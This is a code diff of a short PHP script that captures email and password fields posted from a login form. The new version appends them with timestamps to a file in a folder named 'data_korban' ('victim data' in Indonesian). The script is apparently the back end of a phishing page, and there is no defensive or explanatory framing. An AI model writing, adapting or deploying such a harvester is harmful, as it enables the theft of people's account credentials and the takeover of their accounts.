@@ -1,14 +1,21 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $email = $_POST["email"];
-    $password = $_POST["password"];
 
-    $log = fopen("log.txt", "a");
-    fwrite($log, "Email: $email | Password: $password\n");
-    fclose($log);
+if (isset($_POST['email']) && isset($_POST['password'])) {
 
-    // Redirect ke halaman sukses (dummy)
-    header("Location: success.html");
-    exit();
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    $currentTime = date('Y-m-d H:i:s');
+
+    $file = 'data_korban/hasil.txt';
+
+    $data = "[$currentTime] Email: $email | Password: $password\n";
+
+    file_put_contents($file, $data, FILE_APPEND);
+
+    echo "Data has been saved successfully!";
+} else {
+
+    echo "Error: Email or password is missing!";
 }
 ?>
